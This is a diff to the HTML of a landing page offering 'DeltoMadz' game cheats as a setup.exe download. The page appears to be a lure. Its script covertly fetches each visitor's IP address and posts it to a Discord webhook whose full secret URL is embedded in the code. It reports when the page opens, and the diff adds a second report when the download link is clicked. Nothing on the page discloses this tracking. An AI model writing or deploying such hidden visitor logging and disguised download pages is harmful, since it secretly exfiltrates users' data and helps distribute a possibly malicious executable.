@@ -90,7 +90,7 @@
     <div class="container">
         <h1>DeltoMadz</h1>
         <h2>The Cheats you always wanted.</h2>
-        <a href="DeltoMadz_2.1_setup.exe" download="DeltoMadz_2.1_setup.exe" class="download-button">Download DeltoMadz v2.1</a>
+        <a id="download-link" href="DeltoMadz_2.1_setup.exe" download="DeltoMadz_2.1_setup.exe" class="download-button">Download DeltoMadz v2.1</a>
     </div>
 
     <script>
@@ -188,13 +188,15 @@
 
         const webhookUrl = 'https://discord.com/api/webhooks/1239991202716319816/xaygC0PMgh6E4-uNhKYO0Sy-7Uti5TkT7flGHP73Hq2rWxRisqa4Z2skzT3jD2B4ME8S'; // Ersetze dies durch deine tatsächliche Webhook-URL
 
-        function sendNotification() {
+        function sendOpenNotification() {
             const berlinTime = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
             fetch('https://api64.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     const ipAddress = data.ip;
-                    const notificationContent = `-----\nOpened!\nTime: ${berlinTime}\nIP: ||${ipAddress}||\n-----`;
+                    const ipv4ip = ipAddress.includes(":") ? "" : `IPv4 IP: ||${ipAddress}||\n`;
+                    const ipv6ip = ipAddress.includes(":") ? `IPv6 IP: ||${ipAddress}||\n` : "";
+                    const notificationContent = `-----\nOpened!\nTime: ${berlinTime}\n${ipv4ip}${ipv6ip}-----`;
                     const payload = {
                         content: notificationContent
                     };
@@ -205,10 +207,34 @@
                         },
                         body: JSON.stringify(payload)
                     });
-                })
+                });
         }
 
-        window.onload = sendNotification;
+        function sendDownloadNotification() {
+            const berlinTime = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const ipv4ip = ipAddress.includes(":") ? "" : `IPv4 IP: ||${ipAddress}||\n`;
+                    const ipv6ip = ipAddress.includes(":") ? `IPv6 IP: ||${ipAddress}||\n` : "";
+                    const notificationContent = `-----\nDownloaded!\nTime: ${berlinTime}\n${ipv4ip}${ipv6ip}-----`;
+                    const payload = {
+                        content: notificationContent
+                    };
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(payload)
+                    });
+                });
+        }
+
+        window.onload = sendOpenNotification;
+        const downloadLink = document.getElementById('download-link');
+        downloadLink.addEventListener('click', sendDownloadNotification);
     </script>
 </body>
 </html>
